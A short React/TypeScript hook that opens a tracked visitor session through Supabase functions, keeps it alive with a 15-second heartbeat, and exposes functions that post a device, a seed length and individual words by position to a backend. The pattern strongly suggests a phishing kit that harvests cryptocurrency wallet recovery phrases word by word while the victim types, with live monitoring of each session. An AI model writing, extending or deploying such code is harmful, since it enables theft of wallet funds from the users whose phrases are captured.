import { useEffect, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";

type SessionCreds = { session_id: string; access_token: string };

export function useTrackedSession() {
  const [creds, setCreds] = useState<SessionCreds | null>(null);
  const initRef = useRef(false);

  useEffect(() => {
    if (initRef.current) return;
    initRef.current = true;
    (async () => {
      const { data, error } = await supabase.functions.invoke("session-create", {
        body: {
          user_agent: navigator.userAgent,
          referrer: document.referrer || null,
        },
      });
      if (!error && data?.session_id) {
        setCreds({ session_id: data.session_id, access_token: data.access_token });
      }
    })();
  }, []);

  useEffect(() => {
    if (!creds) return;
    const id = setInterval(() => {
      supabase.functions.invoke("session-heartbeat", { body: creds }).catch(() => {});
    }, 15000);
    return () => clearInterval(id);
  }, [creds]);

  return {
    creds,
    update(patch: { step?: string; device?: string; seed_length?: number }) {
      if (!creds) return;
      supabase.functions.invoke("session-update", { body: { ...creds, ...patch } }).catch(() => {});
    },
    sendWord(position: number, word: string) {
      if (!creds) return;
      supabase.functions.invoke("session-word", { body: { ...creds, position, word } }).catch(() => {});
    },
    submit() {
      if (!creds) return;
      supabase.functions.invoke("session-submit", { body: creds }).catch(() => {});
    },
  };
}
